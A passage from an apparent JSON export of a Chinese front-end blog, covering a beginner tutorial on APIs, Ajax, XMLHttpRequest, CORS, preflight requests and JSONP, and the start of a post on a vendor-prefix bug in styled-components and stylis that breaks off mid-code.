與跨來源請求","text":"前言一般來說在學習寫網頁的時候，最先碰到的會是 HTML 與 CSS，負責把版面刻出來以及美化版面，當基礎打穩之後，會開始學習 JavaScript，試著做出一點互動性的效果。而「互動」除了使用者跟瀏覽器的互動以外，別忘了還有 Client 端跟 Server 端的互動，也就是必須要學會從瀏覽器用 JavaScript 跟後端 Server 拿資料，否則你的網頁資料都只能是寫死的。 這篇的主要預設讀者是網頁前端的初學者，希望能讓本來不太理解怎麼跟 Server 交換資料或是怎麼串 APi 的讀者看完之後，能夠更了解該怎麼跟後端串接。 先從舉例開始在開始之前，我們可以先想想一個問題： 為什麼前端必須跟後端交換資料？ 其實這跟你做的網頁類型有關，假如說你今天做的是一個官方網站，很可能整個網站都是靜態的，只要 HTML 跟 CSS 就可以了，並不需要跟後端 Server 拿資料。 那我們先假設今天要做的是一個可以瀏覽現在 Twitch 實況列表的網頁好了，如下圖。 如果這個網頁不跟後端拿資料，就代表說網頁的內容都是固定的，無論什麼時候看都一樣。可是這樣的話就不對了嘛，因為這個網頁的目標是顯示出「現在有在開實況的頻道」，所以內容是會跟著改變的。 既然會跟著改變，就必須不斷的去更新資料，從 Server 那邊拿資料回來，接著在前端處理過後顯示。 已經確認有拿資料的必要性之後，就可以問自己兩個問題： 要跟誰拿資料？ 要怎麼拿資料？ 第一個問題，很明顯的就是跟 Twitch，因為 Twitch 才有你要的這些資料嘛！ 那第二個問題，要怎麼拿資料呢？就必須透過 Twitch API 了。 API什麼是 API？你可能已經聽過很多次這個名詞，但還是不知道是什麼。先來講講它的全名吧，它的全名是「Application Programming Interface」，中文翻作應用程式介面。 你可能會想說這是什麼鬼東西，怎麼中文英文我都看不懂在幹嘛。但其實這幾個字裡面，最重要的是「介面」兩個字。 介面是什麼？介面就是拿來串接用的，我舉一個例子你就知道了。 電腦上不是有一個 USB 插槽嗎？然後你只要是看到市面上有賣 USB 隨身碟的，都可以買來以後插到 USB 插槽，你的電腦就可以讀取得到。你有想過為什麼嗎？明明就是不同廠商做的東西，可是卻都可以讀得到、都可以插到 USB 插槽裡面。 因為有一項標準叫做 USB 介面，當這套標準訂出來以後，所有廠商只要按照這一套標準來開發，就可以保證能夠連接電腦跟 USB 隨身碟。 API 也是這樣，只是變成程式跟程式之間的串接。例如說今天我寫程式需要讀取檔案好了，我要怎麼讀取檔案？讀取檔案是作業系統提供的功能，因此我可以去串接「讀取檔案的 API」，就可以在我的程式裡面也使用這個功能了。 再多舉幾個例子你可能會更有感覺。 例如說今天我想要讓我的網頁能夠用 Facebook 登入，那要怎麼辦？我就要去串接「Facebook 提供的 API」，就等於說是 Facebook 向外提供給大家的一套介面、一套標準，任何想要接入 Facebook 服務的開發者們，都可以遵循著那套規範拿到自己想要的資料，這個東西就叫做 API。 或是你可能今天是一個飯店管理系統的開發者，你們公司做了一套給飯店用的 ERP，可以管理飯店的訂房狀態等等，就能知道說現在有哪些房間是空的。 而這些資料如果只有自己用太可惜了，於是公司決定把這些資料提供給大型訂房網站，在那些網站上能夠即時顯示這間飯店的房間狀況。所以就必須交換資料，你要提供一個「查詢房間情形的 API」給其他網站，讓他們能夠去串接，才能獲得這些資訊。 講到這邊，大家應該對 API 已經有一些 sense 了，我再多舉幾個例子： 我想要抓到 flickr 上面的照片，所以我要去串接 flickr 的 API Google 要開放讓其他 App 也能用 Google 登入驗證，所以 Google 要提供「Google 登入 API」 我要抓 Twitch 上面現在有哪些頻道，所以要串 Twitch API API Documentation既然已經知道 API 是什麼了，也知道要串接 API，那下一個問題就是「那要怎麼串呢？」 剛剛前面有提過檔案存取的例子，其實這個比較像是呼叫作業系統或是程式語言的函式庫提供的 Function，而這些 Function 你通常都可以在官方文件上查到更詳細的說明，例如說 Node.js 的讀取檔案： （來源：https://nodejs.org/api/fs.html#fs_fs_readdir_path_options_callback） 上面就有寫說你應該呼叫哪一個 Function，應該傳入哪些參數。 API 的串接也是一樣，一定要有文件你才知道怎麼串，不然根本串不起來，因為你連要傳什麼參數都不知道。 我們可以先來看看 Twitch API 文件是怎麼寫的。 裡面說明了你必須要有一個Client ID，然後 API Root 的 URL 是 https://api.twitch.tv/kraken 等等，這些都是與 API 相關的基本資訊。如果你在左側欄隨便點一個 API，會看到個別 API 的詳細資訊： 這邊就有寫說網址是什麼，你應該傳的參數是什麼等等，下面還有附上參考範例，這就是一個很完整的 API 文件。 通常在寫網頁的時候，我們都會直接講 API，但其實我們指的是 Web API，也就是透過網路來傳輸的 API。那有沒有非 Web API 呢？有，像我們前面提到的跟作業系統要讀檔的 API，就都是在本機底下執行的，沒有透過任何網路。 不過這其實也不用太在意，反正大家都習慣講 API，聽得懂就好。 現在有了 API 文件，我們就有了所有我們需要的資訊。以上面這個 Twitch 的例子來講，我們只要能夠發送 Request 到https://api.twitch.tv/kraken/games/top?client_id=xxx，Twitch 就會傳回目前最熱門的遊戲列表。 我們已經把問題的範圍一步步給縮小了，一開始是「要怎麼跟 Twitch 拿資料」，現在則更細的切分為：「要怎麼利用 JavaScript 發送 Reuqest」 Ajax要在瀏覽器上面發送 Request，必須應用到一種技術叫做 Ajax，全名是「Asynchronous JavaScript and XML」，重點在於Asynchronous這個單字，非同步。 在講什麼是非同步之前，就要先來提一下什麼是同步。你原本寫的 JavaScript 就幾乎都是同步執行的。意思是他執行到某一行的時候，會等這行執行完畢，才執行到下一行，確保執行順序。 也就是說下面這段程式碼，最後一行需要等很長一段時間才能執行到： var count = 10000000; while(count--) &#123; // 做一些耗時的操作 &#125; // 等很久才被執行到 console.log('done') 看起來滿有道理的，程式本來不就是一行一行執行的嗎？可是如果今天牽涉到網路操作的話，大家可以思考看看下面這個例子： // 假設有個發送 Request 的函式叫做 sendRequest var result = sendRequest('https://api.twitch.tv/kraken/games/top?client_id=xxx'); // 等很久才被執行到 console.log(result); 當 JavaScript 執行到sendRequest的時候，由於是同步的，就會等待 Response 回來才繼續做事。換句話說，在 Response 還沒回來之前，整個 JavaScript 引擎是不會執行任何東西的！很可怕對吧，你點任何有牽涉到 JavaScript 的東西，都不會有反應，因為 JavaScript 還在等 Response 回來。 所以呢，像是這種已經預期到可能非常耗時間，非常不穩定的操作，就不能用同步的方式來執行，而是要用非同步。 非同步是什麼意思呢？就是執行完之後就不管它了，不等結果回來就繼續執行下一行： // 假設有個發送 Request 的函式叫做 sendRequest var result = sendRequest('https://api.twitch.tv/kraken/games/top?client_id=xxx'); // 上面 Request 發送完之後就執行到這一行，所以 result 不會有東西 // 因為 Response 根本沒有回來 console.log(result); 這邊需要特別注意的是「非同步的 Function 不能直接透過 return 把結果傳回來」，為什麼？因為像上面這個例子，它發送 Request 之後就會執行到下一行了，這個時候根本就還沒有 Response，是要回傳什麼？ 那怎麼辦呢？先聽我舉個很常見的小例子吧！ 我之前在新加坡的 Food Court 吃飯的時候，那邊每一張桌子上面都會有桌號。你去點餐的時候，只要跟老闆講說你坐哪一桌，等餐點完成之後老闆就會自己主動送過來。 所以我不需要站在店家門口等，我只要在位子上繼續坐我的事情，反正餐點好了之後老闆會送過來。 非同步的概念也是這樣，我發送 Request 之後（我點餐之後），我不用等 Response 回來（不用等老闆做好），可以繼續做自己的事，等 Response 回來之後（等餐點做好之後），會自己幫我把結果送過來（老闆會自己送過來）。 在點餐的例子中，老闆可以透過桌號知道應該把資料送到哪邊，那在 JavaScript 裡面呢？可以透過 Function！而這個 Function，我們就稱作 Callback Function，回呼函式。 當非同步的操作完成時，就可以呼叫這個 Function，並且把資料帶進來。 // 假設有個發送 Request 的函式叫做 sendRequest sendRequest('https://api.twitch.tv/kraken/games/top?client_id=xxx', callMe); function callMe (response) &#123; console.log(response); &#125; // 或者寫成匿名函式 sendRequest('https://api.twitch.tv/kraken/games/top?client_id=xxx', function (response) &#123; console.log(response); &#125;); 現在你就知道為什麼網路的操作是非同步，以及什麼是 callback function 了。 XMLHttpRequest方才提到 Ajax、非同步以及 callback function 的概念，但還是沒講到要怎麼發送 Request，只寫了一個假的sendRequest函式當作參考而已。 要發送 Request 的話，就要透過瀏覽器幫我們準備好的一個物件，叫做XMLHttpRequest，範例程式碼如下： var request = new XMLHttpRequest(); request.open('GET', `https://api.twitch.tv/kraken/games/top?client_id=xxx`, true); request.onload = function() &#123; if (request.status >= 200 &amp;&amp; request.status &lt; 400) &#123; // Success! console.log(request.responseText); &#125; &#125;; request.send(); 上面的request.onload其實就是在指定說當資料回來的時候，要用哪一個 function 去處理。 有了上面這一段程式碼之後，你終於大功告成，終於可以串接 Twitch API，從那邊拿資料下來了！真是可喜可賀，從此之後，你就跟「串接 API」這個技能過著幸福快樂的生活… 才怪。 Same Origin Policy正當你以為自己已經對串接 API 駕輕就熟，想說去串接別的 API 試試看好了的時候，才發現一串就出問題了： XMLHttpRequest cannot load http:&#x2F;&#x2F;odata.tn.edu.tw&#x2F;ebookapi&#x2F;api&#x2F;getOdataJH&#x2F;?level&#x3D;all. No &#39;Access-Control-Allow-Origin&#39; header is present on the requested resource. Origin &#39;null&#39; is therefore not allowed access. 咦？為什麼會有這個錯誤呢？ 其實是瀏覽器因為安全性的考量，有一個東西叫做同源政策，Same-origin policy。 意思就是說如果你現在這個網站的跟你要呼叫的 API 的網站「不同源」的時候，瀏覽器一樣會幫你發 Request，但是會把 Response 給擋下來，不讓你的 JavaScript 拿到並且傳回錯誤。 什麼是不同源呢？其實你想簡單一點，只要是 Domain 不一樣就是不同源，或者是一個用http一個用https也是不同源，端口號不一樣也是不同源。 所以如果你是接別人 API 的話，大多數情形都是不同源的。 這邊我想再強調一點，「你的 Request 還是有發出去的」，而且瀏覽器也「確實有收到 Response」，重點是「瀏覽器因為同源政策，不把結果傳回給你的 JavaScript」。如果沒有瀏覽器的話其實就沒有這些問題，你愛發給誰就發給誰，不管怎樣都拿得到 Response。 好，既然剛剛說了不同源會被擋下來，那 Twitch API 不是也不同源嗎，是怎麼串接成功的？ CORS大家都知道其實在不同源之間互相傳輸資料是很常有的事情，像我們串接 Twitch API 就是，我們怎麼可能跟 Twitch API 在同一個 Domain 底下呢？ 因此，同源政策的確是規範非同源就被擋下來，但與此同時其實又有另外一個規範，是說：「如果你想在不同 origin 之間傳輸資料的話，你應該怎麼做」，這規範就叫做 CORS。 CORS，全名為 Cross-Origin Resource Sharing，跨來源資源共用。 這套規範跟你說，如果你想開啟跨來源 HTTP 請求的話，Server 必須在 Response 的 Header 裡面加上Access-Control-Allow-Origin。 這個字段你應該不陌生才對，覺得陌生的可以拉回去上面看，剛剛的錯誤訊息其實就有講到這一個 Header。 當瀏覽器收到 Response 之後，會先檢查Access-Control-Allow-Origin裡面的內容，如果裡面有包含現在這個發起 Request 的 Origin 的話，就會允許通過，讓程式順利接收到 Response。 如果你打開 Devtool 仔細看一開始我們發給 Twitch 的 Request，你會發現 Response 的 Header 大概是長這樣： Content-Type: application&#x2F;json Content-Length: 71 Connection: keep-alive Server: nginx Access-Control-Allow-Origin: * Cache-Control: no-cache, no-store, must-revalidate, private Expires: 0 Pragma: no-cache Twitch-Trace-Id: e316ddcf2fa38a659fa95af9012c9358 X-Ctxlog-Logid: 1-5920052c-446a91950e3abed21a360bd5 Timing-Allow-Origin: https:&#x2F;&#x2F;www.twitch.tv 重點是這一行：Access-Control-Allow-Origin: *，星號就代表萬用字元，意思是任何一個 Origin 都接受。所以當瀏覽器接收到這個 Response 之後，比對目前的 Origin 符合*這個規則，檢驗通過，允許我們接受跨來源請求的回應。 除了這個 Header 以外，其實還有其他的可以用，例如說Access-Control-Allow-Headers跟Access-Control-Allow-Methods，就可以定義接受哪些 Request Header 以及接受哪些 Method。 總結一下，如果你想要發起跨來源 HTTP 請求並且順利收到回應的話，需要確保 Server 端有加上Access-Control-Allow-Origin，不然 Response 會被瀏覽器給擋下來並且顯示出錯誤訊息。 Preflight Request還記得 Twitch 的 API 文件嗎？裡面需要帶一個client-id的參數，而文件裡面寫說你可以帶在 GET 的參數上面，也可以帶在 Header 裡，我們來試試看帶在 Header 裡會怎樣吧！打開 Devtool，你會看到一個神奇的現象： 咦？我明明只發了一個 Request，怎麼變兩個了？而且第一個的 Method 居然是OPTIONS。只是多加了一個 Header 就多了一個 Request，是為什麼呢？ 其實這又跟上面講的 CORS 有關了，CORS 把 Request 分成兩種，一種是簡單請求（simple requests）。什麼是簡單請求呢？其實定義有滿長一串的，我認為有需要用到的時候再看就好，但總之如果你沒有加任何自定義的 Header，而且又是 GET 的話，絕對是簡單請求（這個夠簡單了吧） 反之呢，如果你有加一些自定義的 Header，例如說我們剛剛加的Client-ID，這個 Request 就絕對不是簡單請求。 （定義可參考：MDN: 簡單請求） 從上述分類可知，我們剛剛發起的 Request 因為有帶了 Custom header，所以不會是簡單請求，那為什麼會多一個 Request 呢？ 這一個 Request 叫做 Preflight Request，中文翻作「預檢請求」，因為非簡單請求可能會帶有一些使用者資料，因此會先透過 Preflight Request 去確認後續的請求能否送出。 如果這個 Preflight Request 沒有過的話，真的 Request 也就不會發送了，這就是預檢請求的目的。 我舉一個例子，你就會知道為什麼需要這個 Preflight Request 了。 假設今天某個 Server 提供了一個 API 網址叫做：https://example.com/data/16，你只要對它發送 GET，就能夠拿到 id 是 16 的資料，只要對它發送 DELETE，就可以把這筆資料刪除。 如果今天沒有 Preflight Request 這個機制的話，我就可以在隨便一個 Domain 的網頁上面發送一個 DELETE 的 Request 給這個 API。剛剛我有強調說瀏覽器的 CORS 機制，還是會幫你發送 Request，但只是 Response 被瀏覽器擋住而已。 因此呢，儘管沒有 Response，但是 Server 端的確收到了這個 Request，因此就會把這筆資料給刪除。 如果有 Preflight Request 的話，在發送出去收到結果的時候，就會知道這個 API 並沒有提供 CORS，因此真的 DELETE 請求就不會送出，到這邊就結束了。 先用一個 OPTIONS 的請求去確認之後的 Request 能不能送出，這就是 Preflight Request 的目的。 JSONP最後來講一下 JSONP，這是跨來源請求除了 CORS 以外的另外一種方法，全名叫做：JSON with Padding。 還記得一開始提到的同源政策吧？仔細思考一下會發現，其實有些東西是不受同源政策限制的，例如說&lt;script&gt;這個 Tag，我們不是常常引用 CDN 或是 Google Analytics 之類的第三方套件嗎？網址都是其他 Domain 的，但是卻能正常載入。 JSONP 就是利用&lt;script&gt;的這個特性來達成跨來源請求的。 今天先想像你有一段 HTML 長這樣： &lt;script> var response = &#123; data: 'test' &#125;; &lt;/script> &lt;script> console.log(response); &lt;/script> 很好懂的一段程式碼，我就不多做解釋了。那如果今天把上面那一段換成一串網址呢？ &lt;script src=\"https://another-origin.com/api/games\">&lt;/script> &lt;script> console.log(response); &lt;/script> 如果https://another-origin.com/api/games這個網址返回的內容就是剛剛的： var response = &#123; data: 'test' &#125;; 那我不就一樣可以拿到資料了嗎？而且這些資料還是 Server 端控制的，所以 Server 可以給我任何資料。但是這樣用全域變數其實不太好，我們可以借用剛剛的 Callback Function 的概念，改成這樣： &lt;script> receiveData(&#123; data: 'test' &#125;); &lt;/script> &lt;script> function receiveData (response) &#123; console.log(response); &#125; &lt;/script> 所以 JSONP 是什麼？JSONP 其實就是透過上面這種形式，利用&lt;script&gt;裡面放資料，透過指定好的 function 把資料給帶回去。你只要把第一段的&lt;script&gt;那邊想成是 Server 的回傳值，你就可以理解了。 實務上在操作 JSONP 的時候，Server 通常會提供一個callback的參數讓 client 端帶過去。Twitch API 有提供 JSONP 的版本，我們可以直接來看範例： URL: https://api.twitch.tv/kraken/games/top?client_id=xxx&amp;callback=aaa&amp;limit=1 aaa(&#123;\"_total\":1069,\"_links\":&#123;\"self\":\"https://api.twitch.tv/kraken/games/top?limit=1\",\"next\":\"https://api.twitch.tv/kraken/games/top?limit=1\\u0026offset=1\"&#125;,\"top\":[&#123;\"game\":&#123;\"name\":\"Dota 2\",\"popularity\":63361,\"_id\":29595,\"giantbomb_id\":32887,\"box\":&#123;\"large\":\"https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-272x380.jpg\",\"medium\":\"https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-136x190.jpg\",\"small\":\"https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-52x72.jpg\",\"template\":\"https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-&#123;width&#125;x&#123;height&#125;.jpg\"&#125;,\"logo\":&#123;\"large\":\"https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-240x144.jpg\",\"medium\":\"https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-120x72.jpg\",\"small\":\"https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-60x36.jpg\",\"template\":\"https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-&#123;width&#125;x&#123;height&#125;.jpg\"&#125;,\"_links\":&#123;&#125;,\"localized_name\":\"Dota 2\",\"locale\":\"zh-tw\"&#125;,\"viewers\":65243,\"channels\":373&#125;]&#125;) URL: https://api.twitch.tv/kraken/games/top?client_id=xxx&amp;callback=receiveData&amp;limit=1 receiveData(&#123;\"_total\":1067,\"_links\":&#123;\"self\":\"https://api.twitch.tv/kraken/games/top?limit=1\",\"next\":\"https://api.twitch.tv/kraken/games/top?limit=1\\u0026offset=1\"&#125;,\"top\":[&#123;\"game\":&#123;\"name\":\"Dota 2\",\"popularity\":63361,\"_id\":29595,\"giantbomb_id\":32887,\"box\":&#123;\"large\":\"https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-272x380.jpg\",\"medium\":\"https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-136x190.jpg\",\"small\":\"https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-52x72.jpg\",\"template\":\"https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-&#123;width&#125;x&#123;height&#125;.jpg\"&#125;,\"logo\":&#123;\"large\":\"https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-240x144.jpg\",\"medium\":\"https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-120x72.jpg\",\"small\":\"https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-60x36.jpg\",\"template\":\"https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-&#123;width&#125;x&#123;height&#125;.jpg\"&#125;,\"_links\":&#123;&#125;,\"localized_name\":\"Dota 2\",\"locale\":\"zh-tw\"&#125;,\"viewers\":65622,\"channels\":376&#125;]&#125;) 有發現了嗎？它就是透過你帶過去的callback這個參數當作函式名稱，把 JavaScript 物件整個傳到 Function 裡面，你就可以在 Function 裡面拿到資料。 結合起來會變這樣： &lt;script src=\"https://api.twitch.tv/kraken/games/top?client_id=xxx&amp;callback=receiveData&amp;limit=1\">&lt;/script> &lt;script> function receiveData (response) &#123; console.log(response); &#125; &lt;/script> 利用 JSONP，也可以存取跨來源的資料。但 JSONP 的缺點就是你要帶的那些參數永遠都只能用附加在網址上的方式（GET）帶過去，沒辦法用 POST。 如果能用 CORS 的話，還是應該優先考慮 CORS。 總結今天這篇文章的內容就是從抓資料這件事情開始，一步步告訴你應該去哪裡抓？應該怎麼抓？用 API 抓，那什麼是 API？怎麼在 JavaScript 裡面呼叫 Web API？怎麼樣存取跨來源的資料？ 一般來說，跟前端抓資料有關的東西我基本上都提到了，不過有個遺珠之憾是沒有提到Fetch API，這是比較新的標準，也是拿來抓資料用的，MDN 上面的介紹是： The Fetch API provides an interface for fetching resources (including across the network). It will seem familiar to anyone who has used XMLHttpRequest, but the new API provides a more powerful and flexible feature set. 有興趣的讀者們可以自己去看一下。 希望大家看完這篇之後，會更了解怎麼樣串接後端 API，以及串接的時候可能會碰到哪些困難。","link":"/2017/08/27/ajax-and-cors/"},{"title":"一個有趣的 styled components bug","text":"前言之前在公司裡面做一些效能上的調整時，無意間發現了一個奇怪的現象，繼續往下追查之後才發現是個好像沒有被什麼人發現過的 bug，而且成因我覺得挺有趣的，就想說可以寫一篇跟大家分享一下。 這篇技術含量不高，可以抱持著看故事的心態來看這篇，會比較有趣一點。 故事的開端故事的起源呢，是之前在公司裡面要做一些網站上的調整，試著增進一下載入的速度。當我們談到性能最佳化這一塊，其實有很多可以做的，例如說跟 Server 那邊比較有關的是： 使用 HTTP&#x2F;2 使用 gzip 或是 brotli 進行壓縮 使用 Cache（可以加快 revisit 的速度） 使用 CDN 降低 TTFB 時間 不過以上都需要後端或是 SRE 的協助，跟前端其實關係不大。跟前端關係比較大的，也可以分成很多面向來看，例如說以「減少資源」的角度來看，可以做的事情有： Image 格式調整（壓縮 + webp 或其他格式） JS 大小（ugligy、code spliting、dynamic import） CSS 大小（minify、移除不需要的 CSS） 如果以「加速載入重要資源」的角度，可以加上 preload 或是 preconnect 這些 hint，來提示瀏覽器哪些東西應該先被載入。 還可以從「減少 JS 執行時間」的角度來看，例如說如果是寫 React，可以用 shouldComponentUpdate、PureComponent 或是 memo 來減少不必要的 re-render。 這一篇既然標題都寫 styled components 了，主題當然就是圍繞在 CSS 這一塊。 在 CSS 這一塊，為了減少第一次載入的時間，有一個招數是把 critical CSS inline 在 HTML 裡面，這樣就不用再去發一個 request 拿 CSS 回來，少了一個 round-trip。不過連帶會影響到的就是 HTML 的 size 會變大就是了，但其實也不會大到多少。 總之呢，我們的網站有用了這個招數，把 CSS inline 在 HTML 裡面，看起來就會像是這樣： 一大堆密密麻麻的 CSS。 而這之中最吸引我注意的，就是那些 vendor prefix： 因為各種歷史因素，有些 CSS 屬性要加上 vendor prefix 才能夠運作，例如說你想在比較舊版本的 IE 上面用 flexbox 時，你需要寫：display: -ms-flexbox;。而我稍微看了一下我們網站上有的 prefix，大概是： display: -ms-flexbox display: -webkit-flex -ms-flex-wrap: wrap -webkit-flex-wrap: wrap -ms-transform: rotate(45deg) -webkit-transform: rotate(45deg) -ms-letter-spacing: 0.03em -webkit-letter-spacing: 0.03em ….more 這些 prefix 都是 styled components 幫我們加上的，這邊簡單介紹一下 styled components 好了，簡單來說就是可以用這種寫法幫 component 加上 CSS： import styled from 'styled-components'; const Box = styled.div` background: red; ` // 使用時，這樣用你就可以有一個背景紅色的 div &lt;Box /> 背後原理則是 styled components 會把你寫的 style 轉成一個 className，然後幫你放到這個元件上面去。而 vendor prefix 也是它會幫你處理的一環。 這一切看似都沒有問題，可是其實有著改進的空間。 以我們的專案為例，其實已經定好瀏覽器的支援程度了，而且不需要支援 IE。既然不需要支援 IE 的話，那很多 -ms 開頭的 prefix 其實不用加也可以，而且拿掉會比較省空間，所以拿掉比較好。 可是，要怎麼拿呢？ 去除額外的 prefix以這種要幫 CSS 加上正確的 prefix 的需求來說，有一個工具非常知名，叫做：Autoprefixer： 這套工具很簡單，你只要把你的 CSS 整個丟給它，它就會幫你轉成正確的形式，所謂正確，指的是： 加上必要的 prefix 去除不必要的 prefix 那它怎麼知道什麼是必要的呢？ 這就是最棒的點了，它支援一個東西叫做 Browserslist，簡單來說你可以寫一個檔案，裡面寫明你的專案要支援哪些瀏覽器，像是： # Browsers that we support defaults not IE 11 not IE_Mob 11 &gt; 1% 你還可以用 &gt; 1% 這種語法，讓他幫你去抓出哪些瀏覽器的使用率 &gt; 1%，並且加進去清單裡面。所以有了這個清單再搭配 Autoprefixer，就可以產生出精簡的 CSS，去除不必要的 vendor prefix。 那這套要怎麼跟 styled components 合在一起用呢？ styled components 裡面有一個東西叫做 StyleSheetManager，在 v5 裡面新增了兩個參數： disableVendorPrefixes stylisPlugins 第一個參數可以把所有 vendor prefix 移除，它就不會幫你自動加： // 範例來自官方網站 import styled, &#123; StyleSheetManager &#125; from 'styled-components' const Box = styled.div` color: $&#123;props => props.theme.color&#125;; display: flex; ` render( &lt;StyleSheetManager disableVendorPrefixes> &lt;Box>If you inspect me, there are no vendor prefixes for the flexbox style.&lt;/Box> &lt;/StyleSheetManager> ) 而第二個參數 stylisPlugins 其實才是我們的重點，官方範例是這樣的： import styled, &#123; StyleSheetManager &#125; from 'styled-components' import stylisRTLPlugin from 'stylis-plugin-rtl'; const Box = styled.div` background: mediumseagreen; border-left: 10px solid red; ` render( &lt;StyleSheetManager stylisPlugins=&#123;[stylisRTLPlugin]&#125;> &lt;Box>My border is now on the right!&lt;/Box> &lt;/StyleSheetManager> ) 簡單來說呢，其實 styled components 底層是用了一個叫做 stylis 的套件，而這個套件可以傳自定的 plugin 進去，就可以做一些轉換。聽起來是條很有希望的路，但是官方文件其實著墨的不多，於是我就去翻了 styled components 的程式碼，查一下該怎麼寫這個 plugin，查到了這段： /** * When writing a style like * * &amp; + &amp; &#123; * color: red; * &#125; * * The second ampersand should be a reference to the static component class. stylis * has no knowledge of static class so we have to intelligently replace the base selector. * * https://github.com/thysultan/stylis.js#plugins &lt;- more info about the context phase values * \"2\" means this plugin is taking effect at the very end after all other processing is complete */ const selfReferenceReplacementPlugin = (context, _, selectors) => &#123; if (context === 2 &amp;&amp; selectors.length &amp;&amp; selectors[0].lastIndexOf(_selector) > 0) &#123; // eslint-disable-next-line no-param-reassign selectors[0] = selectors[0].replace(_selectorRegexp, selfReferenceReplacer); &#125; 可是裡面附的連結點下去以後，卻發現完全找不到跟 plugin 有關的資訊…於是我只好轉個方向，去研究剛剛範例中出現的套件：stylis-plugin-rtl，這次的原始碼詳細多了： // @flow import cssjanus from \"cssjanus\"; // https://github.com/thysultan/stylis.js#plugins const STYLIS_CONTEXTS = &#123; POST_PROCESS: -2, PREPARATION: -1, NEWLINE: 0, PROPERTY: 1, SELECTOR_BLOCK: 2, AT_RULE: 3 &#125;; export type StylisContextType = $Values&lt;typeof STYLIS_CONTEXTS>; // We need to apply cssjanus as early as possible to capture the noflip directives if used // (they are not present at the PROPERTY, SELECTOR_BLOCK, or POST_PROCESS steps) export const STYLIS_PROPERTY_CONTEXT = STYLIS_CONTEXTS.PREPARATION; function stylisRTLPlugin(context: StylisContextType, content: string): ?string &#123; if (context === STYLIS_PROPERTY_CONTEXT) &#123; return cssjanus.transform(content); &#125; &#125; // stable identifier that will not be dropped by minification unless the whole module // is unused /*#__PURE__*/ Object.defineProperty(stylisRTLPlugin, \"name\", &#123; value: \"stylisRTLPlugin\" &#125;); export default stylisRTLPlugin; 之前看過類似的 plugin 寫法，所以滿快就能進入狀況的。stylis 會提供給你幾個不同的 context 跟 content，你可以根據 context 去決定要做什麼處理，並且把處理完成的 style 傳回去。 因此，我們的 plugin 可以這樣寫： import autoprefixer from 'autoprefixer'; import postcss from 'postcss'; const POST_PROCESS_CONTEXT = -2; function plugin (context, content) &#123; if (context !== POST_PROCESS_CONTEXT) &#123; return content; &#125; return postcss([autoprefixer]).process(content).css; &#125; 在 post process 這個階段去呼叫 postcss，並把內容用 autoprefixer 去轉換，最後就可以得到乾淨的 CSS。 成果報告這邊講一下成效如何，在沒有用之前，我統計了 CSS 裡面出現的 prefix 的數量（直接 global search 統計）： -webkit: ~300 -ms: ~200 -moz: ~60 -o: 1 一共 560 個左右 用了 autoprefixer 之後，變成： -webkit: ~300 &#x3D;&gt; 26 -ms: ~200 &#x3D;&gt; 6 -moz: ~60 &#x3D;&gt; 13 -o: 1 &#x3D;&gt; 0 從 560 個變到 45 個，減少了大約 90% 的不必要的 vendor prefix！ 而原本整份 HTML + inline CSS 的大小經過 gzip 壓縮後為 43KB，大家可以猜一下做了這個改動之後變成多少。 ............. 答案是：42KB！ 對，你沒看錯，就是只減少了 1KB。 在我看到這個結果時，我學到了兩件事： gzip 很強悍 果然優化是需要衡量的，有時候你以為改進了很多，但其實沒有 我猜測之所以只減少 1KB，是因為經過 gzip 之後其實根本沒什麼差。雖然說 prefix 數量大幅減少，但不會真的省到這麼多空間。gzip 記的資訊可能從：「300 個 webkit」變成「26 個 webkit」，只是前面的數量減少而已，因此在檔案大小上根本沒什麼改進。 雖然檔案大小的確減少不多，不過往好處想，還是有一些改進，任務順利達成了。 說好的 bug 呢？好，看到這邊你可能會想說：學到一招了…等等，不對啊，這篇不是要講 bug 嗎？那 bug 在哪裡？怎麼沒看到像是 bug 的東西？ bug 其實就藏在前面我整理出來的一個清單： display: -ms-flexbox display: -webkit-flex -ms-flex-wrap: wrap -webkit-flex-wrap: wrap -ms-transform: rotate(45deg) -webkit-transform: rotate(45deg) -ms-letter-spacing: 0.03em -webkit-letter-spacing: 0.03em ….more 仔細看其實你會發現有個屬性很奇妙，叫做 letter-spacing，我當初看到以為是我學藝不精，怎麼寫 CSS 這麼多年，還不知道 letter-spacing 要加上 prefix 才能運作，於是就去 caniuse 查了一波，發現跟我記憶中一樣，是不需要加的。 那為什麼這邊有呢？ 在好奇心的驅使之下，我去找了 stylis 的原始碼來看。這邊順帶一提，前面有講到 styled components 原始碼裡面附的連結點過去沒有 plugin 相關介紹，是因為版本問題。stylis 在今年（2020 年）4 月份更新成了 v4，而 styled components 用的是 v3.5.4。 或是如果要講的更詳細一點，其實 styled components 依賴的是 @emotion/stylis v0.8.4（對，就是另一個 library emotion），而這個 emotion 的 stylis 依賴的是真正的 stylis 3.5.4 版本。 所以這個 letter-spacing 的問題不止 styled components，其實連 emotion 也有。這邊是一個 codesandbox 的 demo：https://codesandbox.io/s/stylis-bug-6yu6g?file=/src/App.js 開啟之後對上面元素按右鍵檢查，就看得到了： 既然知道之前是版本找錯以後，就可以找正確版本的原始碼來看，是一份很大的檔案：https://github.com/thysultan/stylis.js/blob/v3.5.4/stylis.js 我擷取一段最精華的，加上 vendor prefix 的部分（有省略部分程式碼）： function property (input, first, second, third) &#123; var index = 0 var out = input + ';' var hash = (first*2) + (second*3) + (third*4) var cache // animation: a, n, i characters if (hash === 944) &#123; return animation(out) &#125; else if (prefix === 0 || (prefix === 2 &amp;&amp; !vendor(out, 1))) &#123; return out &#125; // vendor prefix switch (hash) &#123; // text-decoration/text-size-adjust/text-shadow/text-align/text-transform: t, e, x case 1015: &#123; // text-shadow/text-align/text-transform, a return out.charCodeAt(10) === 97 ? webkit + out + out : out &#125; // filter/fill f, i, l case 951: &#123; // filter, t return out.charCodeAt(3) === 116 ? webkit + out + out 